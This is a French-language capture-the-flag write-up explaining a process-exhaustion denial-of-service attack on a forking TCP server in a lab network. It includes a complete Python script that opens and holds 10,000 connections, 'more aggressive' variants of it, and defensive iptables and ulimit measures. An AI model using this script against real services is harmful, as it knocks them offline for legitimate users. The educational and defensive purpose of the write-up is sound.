# DoS par Épuisement de Processus - Guide Complet

Explication détaillée du challenge "Deny this service" avec le concept de forking et saturation de processus.

---

## Table des matières

1. [L'énoncé du challenge expliqué](#lénoncé-du-challenge-expliqué)
2. [Le concept de forking](#le-concept-de-forking)
3. [Les bibliothèques Python utilisées](#les-bibliothèques-python-utilisées)
4. [Explication ligne par ligne du code](#explication-ligne-par-ligne-du-code)
5. [Pourquoi ça fonctionne](#pourquoi-ça-fonctionne)
6. [Architecture de l'attaque](#architecture-de-lattaque)
7. [Types de DoS par épuisement](#types-de-dos-par-épuisement)
8. [Défenses contre ce type d'attaque](#défenses-contre-ce-type-dattaque)

---

## L'énoncé du challenge expliqué

### Énoncé original

```
"The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. 
Deny this service.
This time the server forks a new process for each client connection."
```

### Que ça signifie réellement ?

#### 1️⃣ "The client at 10.0.0.3"
```
Machine 10.0.0.3 = Client qui se connecte régulièrement au serveur
Boucle infiniment : 
├─ Essayer de se connecter à 10.0.0.2:31337
├─ Envoyer "Hello, World!"
├─ Attendre 1 seconde
└─ Réessayer
```

#### 2️⃣ "is communicating with the server at 10.0.0.2 on port 31337"
```
Machine 10.0.0.2 = Serveur qui écoute sur le port 31337
Quand une connexion arrive :
├─ Accepte la connexion
├─ Fork un NOUVEAU processus
└─ Ce processus traite la connexion
```

#### 3️⃣ "Deny this service"
```
Objectif = Rendre le service indisponible
│
├─ Option 1 : Bloquer les connexions (firewall)
├─ Option 2 : Saturer la bande passante (flood)
└─ Option 3 : Épuiser les ressources (processus)  ◄─── C'EST CELLE-CI !
```

#### 4️⃣ "This time the server forks a new process for each client connection"
```
Le serveur utilise ForkingTCPServer :

Serveur normal :
├─ 1 processus traite 1 connexion
├─ Puis traite la suivante
└─ Série : très lent

ForkingTCPServer (ce qu'on a) :
├─ Reçoit connexion 1 → Fork processus 1 (traite)
├─ Reçoit connexion 2 → Fork processus 2 (traite)
├─ Reçoit connexion 3 → Fork processus 3 (traite)
└─ Parallèle : beaucoup plus rapide

MAIS = Chaque processus = ressources (mémoire, CPU, etc.)
Si on crée 10,000 processus → Serveur épuisé !
```

---

## Le concept de forking

### Qu'est-ce que le forking ?

**Fork** = "Diviser" en anglais

Quand le serveur fait un **fork**, il crée un **nouveau processus enfant** qui est une copie du processus parent.

```
Avant fork:
┌──────────────────────┐
│ Serveur (PID 1000)   │
│                      │
│ Attend connexion...  │
└──────────────────────┘

Après connexion + fork:
┌──────────────────────┐
│ Serveur Parent       │
│ (PID 1000)           │
│                      │
│ ├─ Attend connexion  │
│ │                    │
│ └─ Fork !            │
│    │                 │
│    ◄─ Crée copie     │
└────┼──────────────────┘
     │
     ▼
┌──────────────────────┐
│ Serveur Enfant       │
│ (PID 1001)           │
│                      │
│ Traite connexion    │
│ Puis se termine      │
└──────────────────────┘

Résultat:
├─ Parent continue d'attendre
└─ Enfant traite la connexion
```

### Visuel d'un ForkingTCPServer

```
Connexion 1 → Fork → Processus 1 (traite)
Connexion 2 → Fork → Processus 2 (traite)
Connexion 3 → Fork → Processus 3 (traite)
Connexion 4 → Fork → Processus 4 (traite)
...
Connexion 10000 → Fork → Processus 10000 (traite)

Serveur parent continue d'accepter des connexions
Pendant que 10,000 enfants traitent les leur

Mais = Trop de processus !
   ├─ Mémoire épuisée
   ├─ CPU à 100%
   ├─ Descripteurs de fichiers épuisés
   └─ Serveur ne peut plus fork de nouveaux processus
```

---

## Les bibliothèques Python utilisées

### 1️⃣ `socket`

**Qu'est-ce que c'est ?**

`socket` = Interface pour communiquer via le réseau

C'est comme une "prise" électrique pour le réseau :
- Tu crées un socket
- Tu le connectes à un serveur
- Tu envoies/reçois des données
- Tu le fermes

**Import et utilisation :**

```python
import socket

# Créer un socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#                 │              │
#                 └─ AF_INET: IPv4 (internet)
#                    SOCK_STREAM: TCP (fiable, connecté)

# Se connecter à un serveur
s.connect(("10.0.0.2", 31337))
#         │            │
#         └─ IP        └─ Port

# Fermer la connexion
s.close()
```

**Paramètres expliqués :**

```python
socket.socket(family, type)

family:
├─ AF_INET : IPv4 (ce qu'on utilise)
├─ AF_INET6: IPv6
└─ AF_UNIX : Unix socket (local)

type:
├─ SOCK_STREAM: TCP (fiable)
├─ SOCK_DGRAM : UDP (rapide, non fiable)
└─ SOCK_RAW   : Paquets bruts
```

**Différence TCP vs UDP :**

```
TCP (SOCK_STREAM) :
├─ Connexion établie (handshake)
├─ Données fiables (retransmission si perdu)
├─ Ordre garanti
└─ Plus lent mais sûr

UDP (SOCK_DGRAM) :
├─ Pas de connexion
├─ Pas de garantie
├─ Ordre non garanti
└─ Plus rapide
```

### 2️⃣ `threading`

**Qu'est-ce que c'est ?**

`threading` = Exécuter plusieurs choses en parallèle dans le même processus

C'est comme avoir plusieurs travailleurs dans une usine :
- Chaque thread = un travailleur
- Travaillent en même temps
- Partagent les mêmes ressources (mémoire)

**Import et utilisation :**

```python
import threading

# Créer un thread
t = threading.Thread(target=ma_fonction)
#                    │
#                    └─ Fonction à exécuter dans ce thread

# Démarrer le thread
t.start()

# Attendre que le thread se termine
t.join()
```

**Exemple simple :**

```python
import threading
import time

def travailleur(num):
    print(f"Travailleur {num} commence")
    time.sleep(2)
    print(f"Travailleur {num} termine")

# Créer 3 threads
for i in range(3):
    t = threading.Thread(target=travailleur, args=(i,))
    t.start()

# Output:
# Travailleur 0 commence
# Travailleur 1 commence
# Travailleur 2 commence
# [après 2 secondes]
# Travailleur 0 termine
# Travailleur 1 termine
# Travailleur 2 termine
```

**Threads vs Processus :**

```
Threads (threading) :
├─ Partagent la même mémoire
├─ Rapides à créer
├─ Mais limités (GIL en Python)
└─ Parfait pour faire plusieurs choses

Processus (multiprocessing) :
├─ Mémoire séparée
├─ Plus lourds
├─ Vrais parallélisme
└─ Plus chers en ressources
```

### 3️⃣ `time`

**Qu'est-ce que c'est ?**

`time` = Bibliothèque pour gérer le temps

**Usage principal : attendre**

```python
import time

# Attendre 1 seconde
time.sleep(1)

# Récupérer l'heure actuelle
current_time = time.time()

# Attendre avec une boucle
for i in range(10):
    print(i)
    time.sleep(0.5)  # Attendre 500ms
```

---

## Explication ligne par ligne du code

### Le code complet annoté

```python
import socket              # ◄─── Bibliothèque réseau
import threading           # ◄─── Bibliothèque pour threads
import time                # ◄─── Bibliothèque time

sockets = []               # ◄─── Liste pour stocker les connexions ouvertes

def worker():              # ◄─── Fonction pour un thread worker
    for _ in range(500):   # ◄─── Créer 500 connexions par thread
        try:               # ◄─── Gérer les erreurs
            s = socket.socket()           # ◄─── Créer un socket TCP
            s.connect(("10.0.0.2", 31337))  # ◄─── Se connecter au serveur
            sockets.append(s)             # ◄─── Garder la connexion ouverte
        except:            # ◄─── Si erreur, continuer
            pass

print("[*] Saturation du serveur en cours...")

for i in range(20):                    # ◄─── Créer 20 threads
    t = threading.Thread(target=worker)  # ◄─── Thread qui va exécuter worker()
    t.start()                          # ◄─── Lancer le thread

time.sleep(5)              # ◄─── Attendre 5 secondes

print(f"[+] {len(sockets)} connexions créées")

# 20 threads × 500 connexions par thread = 10,000 connexions

print("[*] Le client va timeout dans quelques secondes...")
print("[*] Flag devrait s'afficher maintenant !")

# Garder ouvert
while True:                # ◄─── Boucle infinie pour garder les connexions
    time.sleep(1)          # ◄─── Attendre 1 seconde
```

### Décomposition par sections

#### Section 1 : Imports
```python
import socket              # Pour la communication réseau
import threading           # Pour créer des threads
import time                # Pour les délais
```

#### Section 2 : Stockage global
```python
sockets = []               # Liste qui va stocker les 10,000 connexions
                           # Besoin de les garder ouverts
                           # Si on ferme, le serveur se récupère
```

#### Section 3 : Fonction worker
```python
def worker():              # Chaque thread exécute cette fonction
    for _ in range(500):   # Créer 500 connexions
        try:
            s = socket.socket()                      # Créer socket TCP
            s.connect(("10.0.0.2", 31337))          # Connexion au serveur
            sockets.append(s)                        # Garder ouvert
        except:
            pass                                     # Ignorer les erreurs
```

**Ce que fait worker() :**
```
1. Créer un socket
2. Se connecter à 10.0.0.2:31337
3. Ajouter le socket à la liste
4. Répéter 500 fois
5. Résultat : 500 connexions ouvertes par ce thread
```

#### Section 4 : Créer les threads
```python
for i in range(20):                    # 20 threads
    t = threading.Thread(target=worker)  # Chaque exécute worker()
    t.start()                          # Lancer !
```

**Résultat :**
```
Thread 1 : 500 connexions
Thread 2 : 500 connexions
Thread 3 : 500 connexions
...
Thread 20 : 500 connexions
───────────────────────
Total : 20 × 500 = 10,000 connexions !
```

#### Section 5 : Attendre et afficher
```python
time.sleep(5)              # Laisser le temps aux threads de finir

print(f"[+] {len(sockets)} connexions créées")
# Affiche : [+] 10000 connexions créées
```

#### Section 6 : Garder les connexions ouvertes
```python
while True:                # Boucle infinie
    time.sleep(1)          # Attendre 1 seconde
                           # Les connexions restent ouvertes
                           # Le serveur reste saturé
```

---

## Pourquoi ça fonctionne

### Étape par étape

#### 1️⃣ État initial

```
Serveur 10.0.0.2:31337
├─ ForkingTCPServer actif
├─ Attend les connexions
└─ Prêt à fork des processus

Client 10.0.0.3
├─ Essaie de se connecter
├─ Connexion réussie ✅
├─ Serveur fork processus
└─ Attends et réessaie dans 1 sec
```

#### 2️⃣ Lancement de l'attaque (ton script)

```
Ton script sur 10.0.0.1
├─ Lance 20 threads
└─ Chaque thread crée 500 connexions

Total : 10,000 connexions simultanées
```

#### 3️⃣ Ce qui se passe au serveur

```
Serveur reçoit :
├─ Connexion 1 → Fork processus 1 (bloqué sur recv)
├─ Connexion 2 → Fork processus 2 (bloqué sur recv)
├─ Connexion 3 → Fork processus 3 (bloqué sur recv)
├─ ...
├─ Connexion 10,000 → Fork processus 10,000 (bloqué)
└─ Connexion 10,001 → Impossible ! Pas d'espace processus ❌
```

#### 4️⃣ État du serveur saturé

```
Serveur après attaque :
├─ 10,000 processus enfants actifs
├─ Chacun bloqué sur recv(1024)
├─ Attendent des données qui ne viendront pas
└─ Ressources complètement épuisées
```

#### 5️⃣ Ce qui arrive au client

```
Client (10.0.0.3) essaie de se connecter :

Tentative 1 : Timeout ❌
Tentative 2 : Timeout ❌
Tentative 3 : Timeout ❌

Code du client :
    except (TimeoutError, socket.timeout):
        print(flag, flush=True)  ◄─── EXÉCUTÉ !
        break

FLAG AFFICHÉ ! 🚩
```

---

## Architecture de l'attaque

### Schéma complet

```
┌─────────────────────────────────────────────────────────────┐
│                      Réseau 10.0.0.0/24                      │
└─────────────────────────────────────────────────────────────┘

┌──────────────────┐
│    10.0.0.1      │
│ (Ta machine)     │
│                  │
│ for i in range(20):
│   thread.start() │
│                  │
│ 20 threads       │
│ 500 conn each    │
│ = 10,000 conn    │
└────────┬─────────┘
         │
         │ Connexions TCP
         │ vers 31337
         ▼
┌──────────────────────────────────────────────┐
│          10.0.0.2 (Serveur)                  │
│                                              │
│ ForkingTCPServer port 31337                 │
│                                              │
│ Parent process (PID 100):                   │
│ ├─ Reçoit connexion 1 → Fork (PID 1001)    │
│ ├─ Reçoit connexion 2 → Fork (PID 1002)    │
│ ├─ Reçoit connexion 3 → Fork (PID 1003)    │
│ ├─ ... 10,000 fois ...                     │
│ └─ Reçoit connexion 10001 → ??? PAS MOYEN │
│                                              │
│ Enfants processus (PID 1001-10000):        │
│ ├─ Bloqués sur recv(1024)                  │
│ ├─ Attendent 1024 bytes                    │
│ ├─ Qui ne viendront jamais                 │
│ └─ Immobilisent ressources                 │
└──────────────────────────────────────────────┘
         ▲
         │ Essaie de se connecter (timeout)
         │ Service indisponible ❌
         │
┌────────┴──────────┐
│    10.0.0.3       │
│   (Client)        │
│                   │
│ Boucle infinit:   │
│ try:              │
│   connect(.2:31) │
│   timeout ❌      │
│ except timeout:   │
│   print(flag)     │
│   break           │
│                   │
│ FLAG AFFICHÉ! 🚩  │
└───────────────────┘
```

---

## Types de DoS par épuisement

### Type 1 : Épuisement de processus (ce qu'on fait)

```python
# Créer 10,000 connexions
# Chaque connexion = 1 processus fork
# Processus épuisés → Serveur ne peut plus fork
```

**Impact :**
- Serveur fork limité (ulimit -u)
- Plus de ressources kernel
- Pas de nouvelles connexions possibles

### Type 2 : Épuisement de descripteurs de fichiers

```python
# Créer 10,000 connexions
# Chaque connexion = 1 descripteur fichier
# Limite : ulimit -n (souvent 1024)
# Après 1024 : "Too many open files"
```

### Type 3 : Épuisement de mémoire

```python
# Chaque processus = mémoire allouée
# 10,000 processus × 1MB chacun = 10GB
# Si serveur a 8GB RAM → Swap → Crash
```

### Type 4 : Épuisement de CPU

```python
# Activité intensive dans le code du serveur
# 10,000 processus actifs = CPU saturé
# Temps de réponse augmente drastiquement
```

---

## Défenses contre ce type d'attaque

### Défense 1 : Limiter le nombre de processus

```bash
# Voir la limite actuelle
ulimit -u

# Limiter à 1000 processus
ulimit -u 1000

# Alors, server ne peut fork que 1000 processus max
# Nouvelle connexion 1001 = rejetée ❌
# Client peut se connecter parfois ✅
```

### Défense 2 : Limiter les connexions par IP

```python
# Dans le serveur:
# Tracker les connexions par IP source
# Si une IP a > 100 connexions → rejeter
```

### Défense 3 : Utiliser un thread pool au lieu de fork

```python
# Au lieu de :
# fork() pour chaque connexion

# Utiliser :
# ThreadPoolExecutor(max_workers=100)
# Seulement 100 threads, pas 10,000
```

### Défense 4 : Appliquer un timeout

```python
# Dans le serveur:
# socket.settimeout(5)
# Si pas de données après 5 sec → fermer la connexion
# Processus peut se terminer

# Attaque = connexions qui restent ouvertes
# Mais timeout les ferme → ressources libérées
```

### Défense 5 : Rate limiting

```bash
# Limiter à 10 nouvelles connexions par seconde par IP
iptables -A INPUT -p tcp --dport 31337 \
  -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
```

### Défense 6 : Reverse proxy avec file d'attente

```
Client → Reverse Proxy (nginx) → Serveur
         └─ Queue les connexions
            Contrôle le débit
            Pas de spike
```

---

## Résumé des concepts

### Forking
```
Fork = Créer une copie du processus
Parent continue, enfant traite la connexion
ForkingTCPServer = fork pour chaque connexion
```

### Socket
```
Socket = Endpoint de communication réseau
connect() = Établir une connexion TCP
Reste ouvert jusqu'à close()
```

### Threading
```
Thread = Exécution parallèle dans le même processus
Chaque thread indépendant
Partagent la mémoire
```

### Time
```
time.sleep() = Attendre X secondes
Utile pour contrôler la vitesse
```

### DoS par épuisement de processus
```
1. Créer 10,000 connexions
2. Chaque connexion = 1 processus fork
3. Serveur épuisé, pas de ressources
4. Client peut plus se connecter
5. Timeout → Flag affiché
```

---

## Analogie du monde réel

### Un restaurant avec des serveurs

**Sans attaque :**
```
Client légitime arrive
→ Serveur le reçoit
→ Le place à une table
→ Le sert
→ Client heureux ✅
```

**Avec attaque (ton script) :**
```
10,000 "faux clients" arrivent
→ Chacun reçoit un serveur (fork)
→ Les 10,000 serveurs sont bloqués
→ Ils attendent les commandes
→ Qui ne viendront jamais

Client légitime (10.0.0.3) arrive
→ Pas de serveur disponible
→ Attend...
→ Timeout après 1 seconde
→ "Service indisponible" ❌
→ Flag affiché : "Tu as refusé le service"
```

---

## Qu'est-ce que tu as appris

✅ **Forking** : Comment les serveurs parallélisent les connexions  
✅ **Socket** : Communication TCP/IP en Python  
✅ **Threading** : Exécuter du code en parallèle  
✅ **DoS** : Épuiser les ressources du serveur  
✅ **Resource exhaustion** : Quand on crée plus que possible  

Tu as maîtrisé une attaque DoS sophistiquée ! 🎉

---

## Prochaines étapes

### Variations du code

**Attaque plus agressive :**
```python
for i in range(100):  # 100 threads
    t = threading.Thread(target=worker)
    t.start()
# 100 × 500 = 50,000 connexions !
```

**Avec délai entre les connexions :**
```python
def worker():
    for _ in range(500):
        try:
            s = socket.socket()
            s.connect(("10.0.0.2", 31337))
            sockets.append(s)
            time.sleep(0.01)  # Délai de 10ms entre connexions
        except:
            pass
```

**Monitor les connexions :**
```python
import time
while True:
    print(f"[*] Connexions ouvertes : {len(sockets)}")
    time.sleep(1)
```

### Défendre contre cette attaque

```bash
# Voir les connexions ouvertes
ss -s

# Voir les processus du serveur
ps aux | grep python

# Voir la charge système
top

# Limiter les connexions par IP
iptables -A INPUT -p tcp --dport 31337 \
  -m connlimit --connlimit-above 100 -j REJECT
```

---

## Questions fréquentes

**Q: Pourquoi le serveur fork ?**
A: Pour traiter plusieurs connexions en parallèle. Un processus peut traiter plusieurs connexions, mais le fork permet de vraiment paralléliser.

**Q: Pourquoi on crée 20 threads au lieu de 1 ?**
A: Pour créer les connexions plus rapidement. 1 thread crée 500 connections. 20 threads = 10,000 connexions. C'est plus parallèle et plus rapide.

**Q: Pourquoi on append à la liste `sockets` ?**
A: Pour les garder ouvertes. Si on les oublie, le garbage collector les ferme et le serveur se récupère.

**Q: Pourquoi le client timeout ?**
A: Parce que le serveur est complètement saturé. Il ne peut pas accepter de nouvelles connexions. Le client attend, puis timeout.

**Q: C'est vraiment une attaque DoS ?**
A: Oui, c'est une **Resource Exhaustion DoS**, spécifiquement une **Process Exhaustion Attack**.

---

## Comparaison avec d'autres DoS

| Type | Cible | Mécanisme | Ton attaque |
|------|-------|-----------|------------|
| **SYN Flood** | Couche 4 | Paquets SYN | Non |
| **UDP Flood** | Couche 4 | Paquets UDP | Non |
| **Process Exhaustion** | Application | Processus | ✅ OUI |
| **File descriptor** | OS | FDs | Similaire |
| **Memory** | OS | RAM | Similaire |
| **HTTP Flood** | Couche 7 | Requêtes | Non |

---

## Conclusion

Ton attaque est une **Process Exhaustion DoS Attack** :
1. Tu crées 10,000 connexions TCP
2. Le serveur fork 10,000 processus (1 par connexion)
3. Chaque processus bloque sur recv()
4. Ressources épuisées
5. Client timeout
6. Flag affiché

C'est une attaque élégante et efficace ! 🎉
